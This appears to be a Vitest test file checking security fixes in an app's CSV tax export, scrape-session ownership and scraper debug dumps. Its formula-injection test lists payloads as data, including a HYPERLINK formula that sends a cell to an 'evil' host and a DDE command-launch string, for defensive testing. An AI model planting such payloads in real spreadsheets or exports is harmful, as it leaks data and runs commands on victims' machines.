import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { schedule112ACsvCellForTest } from '../../src/services/tax.service.js';

/**
 * SEC-20 — CSV formula injection in the Schedule 112A export.
 * SEC-21 — the CarInfo scrape session had no owner.
 * SEC-26 — scraper debug dumps wrote real owner PII to the package root.
 */

const SRC = join(__dirname, '..', '..', 'src');
const read = (rel: string) => readFileSync(join(SRC, rel), 'utf8');

describe('SEC-20: CSV export neutralises spreadsheet formulas', () => {
  /**
   * What matters is the first character the spreadsheet sees in the cell,
   * which is inside the CSV quoting when the value also contains a comma or
   * a quote. Unwrap before asserting.
   */
  function cellContent(raw: string): string {
    const out = schedule112ACsvCellForTest(raw);
    if (out.startsWith('"') && out.endsWith('"')) {
      return out.slice(1, -1).replace(/""/g, '"');
    }
    return out;
  }

  it('prefixes cells that a spreadsheet would evaluate', () => {
    for (const payload of [
      '=HYPERLINK("http://evil/steal?"&A1,"x")',
      '=cmd|\' /C calc\'!A0',
      '+1+1',
      '-2+3',
      '@SUM(A1)',
      '\tleading tab',
    ]) {
      expect(cellContent(payload).startsWith("'"), `${payload} should be escaped`).toBe(true);
    }
  });

  it('leaves ordinary values alone', () => {
    expect(schedule112ACsvCellForTest('RELIANCE INDUSTRIES')).toBe('RELIANCE INDUSTRIES');
    expect(schedule112ACsvCellForTest('1234.56')).toBe('1234.56');
  });

  it('still quotes separators and escapes quotes', () => {
    expect(schedule112ACsvCellForTest('a,b')).toBe('"a,b"');
    expect(schedule112ACsvCellForTest('say "hi"')).toBe('"say ""hi"""');
  });

  it('handles a value that is both a formula and contains a comma', () => {
    const out = schedule112ACsvCellForTest('=A1,B1');
    expect(out.startsWith('"\'')).toBe(true);
  });
});

describe('SEC-21: scrape sessions are owned', () => {
  const sessions = read('lib/playwrightSessions.ts');

  it('stores the owning user on the session', () => {
    expect(sessions).toContain('userId: string;');
    expect(sessions).toContain('createSession(regNo: string, userId: string)');
  });

  it('requires a userId to resolve a session and rejects a mismatch', () => {
    expect(sessions).toContain('getSession(id: string, userId: string)');
    expect(sessions).toContain('session.userId !== userId');
  });

  it('the CarInfo OTP step passes the caller through', () => {
    const carinfo = read('adapters/vehicle/carinfoPlaywright.ts');
    expect(carinfo).toContain('playwrightSessionManager.getSession(sessionId, userId)');
  });
});

describe('SEC-26: scraper debug dumps are opt-in and off the package root', () => {
  const carinfo = read('adapters/vehicle/carinfoPlaywright.ts');

  it('gates every dump behind an explicit flag', () => {
    expect(carinfo).toContain("process.env.CARINFO_DEBUG_DUMPS === 'true'");
    // No un-gated writes left.
    for (const line of carinfo.split('\n')) {
      if (line.includes('fs.writeFileSync(`')) {
        throw new Error(`un-namespaced debug write remains: ${line.trim()}`);
      }
    }
  });

  it('writes through a dedicated directory helper', () => {
    expect(carinfo).toContain('debugDumpPath(');
  });
});
